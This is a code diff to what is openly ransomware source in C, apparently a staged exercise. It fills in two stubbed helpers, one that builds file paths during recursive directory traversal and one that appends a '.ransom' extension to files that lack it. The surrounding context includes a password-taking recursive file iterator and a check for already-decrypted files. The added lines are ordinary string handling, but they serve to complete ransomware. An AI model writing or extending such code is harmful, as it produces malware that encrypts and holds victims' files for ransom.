@@ -1,6 +1,7 @@
 #include "ransom.h"
 #include <stdbool.h>
 #include <stdio.h>
+#include <string.h>
 
 #define LEN_RANSOM_EXTENSION (strlen(".ransom"))
 #define LEN_DECRYPTED_EXTENSION (strlen(".decrypted"))
@@ -45,14 +46,31 @@ int iter_recursively_through_files(char *path, char *password,
 
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
-    // step 1
+    size_t plen = strlen(parentpath);
+    if (plen == 0) {
+        snprintf(finalpath, MAX_FILEPATH, "%s", currentpath);
+        return;
+    }
+
+    if (parentpath[plen - 1] == '/')
+        snprintf(finalpath, MAX_FILEPATH, "%s%s", parentpath, currentpath);
+    else
+        snprintf(finalpath, MAX_FILEPATH, "%s/%s", parentpath, currentpath);
 }
 
 void add_file_extension(const char *filename, char *opt_filename)
 {
-    // step 1
-}
+    const char *ext = ".ransom";
+    size_t flen = strlen(filename);
+    size_t elen = strlen(ext);
 
+    if (flen >= elen && strcmp(&filename[flen - elen], ext) == 0) {
+        snprintf(opt_filename, MAX_FILEPATH, "%s", filename);
+        return;
+    }
+
+    snprintf(opt_filename, MAX_FILEPATH, "%s%s", filename, ext);
+}
 
 /*
 ** As you can compare with the skip_already_decrypted for the decryption algorithm,
@@ -90,4 +108,3 @@ bool skip_already_decrypted(const char *path)
         return true;
     return false;
 }
-
